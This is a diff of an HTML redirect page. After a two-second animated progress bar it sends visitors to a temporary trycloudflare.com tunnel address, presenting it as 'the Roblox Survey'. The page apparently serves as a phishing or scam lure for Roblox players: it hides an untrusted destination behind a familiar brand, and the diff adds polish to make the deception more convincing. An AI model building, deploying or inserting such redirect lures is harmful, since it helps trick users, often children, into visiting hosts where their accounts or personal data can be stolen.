@@ -1,15 +1,88 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <meta http-equiv="refresh" content="0; url=https://west-offshore-heard-reader.trycloudflare.com/" />
+    <meta http-equiv="refresh" content="2; url=https://west-offshore-heard-reader.trycloudflare.com/" />
     <title>Redirecting...</title>
+    <style>
+      body {
+        margin: 0;
+        height: 100vh;
+        background: linear-gradient(180deg, #000000, #1a1a1a);
+        font-family: Arial, sans-serif;
+        color: white;
+        overflow: hidden;
+      }
+
+      #container {
+        background: #121212;
+        max-width: 480px;
+        margin: 4rem auto 3rem auto;
+        border-radius: 12px;
+        padding: 2rem;
+        box-shadow: 0 0 20px #000;
+        user-select: none;
+        position: relative;
+        z-index: 10;
+        color: white;
+        text-align: center;
+      }
+
+      h1 {
+        font-weight: 900;
+        font-size: 1.8rem;
+        margin-bottom: 1rem;
+        color: white;
+      }
+
+      p {
+        color: #ccc;
+        font-size: 1rem;
+        margin-top: 1rem;
+      }
+
+      #progressContainer {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 6px;
+        background: #222;
+        z-index: 20;
+      }
+
+      #progressBar {
+        height: 100%;
+        width: 0%;
+        background: #eee;
+        transition: width 0.3s ease;
+      }
+    </style>
   </head>
   <body>
-    <p>Redirecting to the Roblox Survey...</p>
+    <div id="progressContainer">
+      <div id="progressBar"></div>
+    </div>
+
+    <div id="container">
+      <h1>Redirecting...</h1>
+      <p>Taking you to the Roblox Survey now. One moment!</p>
+    </div>
+
     <script>
       // In case meta refresh doesn't work
-      window.location.href = "https://west-offshore-heard-reader.trycloudflare.com/";
+      window.setTimeout(() => {
+        window.location.href = "https://west-offshore-heard-reader.trycloudflare.com/";
+      }, 2000);
+
+      // Animate progress bar
+      const bar = document.getElementById('progressBar');
+      let percent = 0;
+      const interval = setInterval(() => {
+        percent += 2;
+        bar.style.width = percent + '%';
+        if (percent >= 100) clearInterval(interval);
+      }, 40);
     </script>
   </body>
 </html>
